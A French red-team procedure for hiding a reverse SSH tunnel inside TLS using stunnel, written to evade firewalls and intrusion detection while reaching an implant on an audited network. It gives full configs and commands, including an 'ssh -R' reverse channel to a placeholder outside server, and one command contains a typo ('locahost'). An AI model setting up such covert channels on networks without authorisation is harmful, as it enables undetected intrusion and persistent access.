SSH Tunneling/TLS Tunneling

Cette procédure détaille les étapes nécessaires à la mise en place d’un tunnel SSH encapsulé dans un tunnel TLS afin de bypass les IPS et les Firewalls.

Contexte

Dans un contexte d’intrusion RedTeam, il est possible d’avoir un implant placé sur le réseau de l’netreprise audité. Il est donc nécessaire d’établir une connexion sécurisée avec cette implant en faisant en sorte qu’elle soit indetectable. C’est pourquoi nous ferons passer notre traffic SSH comme étant du traffic HTTPS ou TLS.

Tout au long de la procédure nous évoquerons deux machines distinctes, le client et le serveur. voici un schéma permettant de mieux comprendre l’architectuure à laquelle nous faisons face :

Installation des paquets

Tout d’abord nous devons installer un paquet nécessaire au bon fonctionnement de notre liaison :

#Client
sudo apt install stunnel4

#Serveur
sudo apt install stunnel4

Stunnel4 est le paquet qui nous permettra de monter des tunnels TLS chiffrés.

Génération du certificat

Le protocole TLS nécessite un certificat pour pouvoir chiffrer les données qu’il fait transiter. Voici la commande permettant d’en générer un :

sudo openssl req -new -x509 -days 365 -nodes -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem

TLS Tunneling

Une fois stunnel4 installé sur les deux machines, nous allons maintenant le configurer afin qu’il puisse établir une connexion sécurisée entre ces dernières.

Pour ceci, sur le serveur, nous allons créer un fichier /etc/stunnel/stunnel.conf :

# Serveur
cat >> /etc/stunnel/stunnel.conf << EOF
client = no
[reverse-ssh]
cert = /etc/stunnel/stunnel.pem
accept = 443
connect = 22
EOF

Cette configuration indique que toutes les connexions reçues sur le port 443 de cette machine seron renvoyées sur le port 22 de cette même machine.

Une fois ceci fait nous allons créer le même fichier mais cette fois sur la machine cliente :

# Client
cat >> /etc/stunnel/stunnel.conf << EOF
client = yes
[reverse-ssh]
accept = 127.0.0.1:2222
connect = SERVEUR_IP:443
EOF

Cette configuration indique que toutes le connexions entrantes sur le port 2222 de cette machine seront encapsulées dans ce tunnel TLS et envoyées vers le serveur sur le port 443.

Maintenant que les deux acteurs de la liaisons sont configurés nous pouvons démarrer le service :

# Serveur
sudo systemctl start stunnel4
sudo netstat -plantu | grep stunnel4 # Le port 443 est censé être en écoute

#Client
sudo systemctl start stunnel4

SSH Tunneling

Maintenant que notre tunnel TLS est fonctionnel, nous allons maintenant faire passer notre tunnel SSH dans ce dernier. Pour ceci nous allons taper cette commande sur la machine cliente :

# Client
ssh -R 2224:locahost:22 -p 2222 user_serveur@ip_serveur -N -v

Cette commande va ouvrir le port 2224 en écoute locale sur le serveur, lorsque nous tenterons de nous connecter sur ce port là depuis le serveur, nous serons redirigé sur le port 2222 du client qui est l’extrémité de notre tunnel TLS, puis nous serons ensuite redirigé sur le port 22 du client qui est le serveur SSH de ce dernier.

Nous pouvons maintenant vérifier la présence de notre tunnel SSH du côté du serveur :

# Serveur
sudo netstat -plantu | grep 2224

Maintenant que notre tunnel SSH est en place, nous pouvons nous y connecter grâce à la commande suivante :

# Serveur
ssh user_client@127.0.0.1 -p 2224
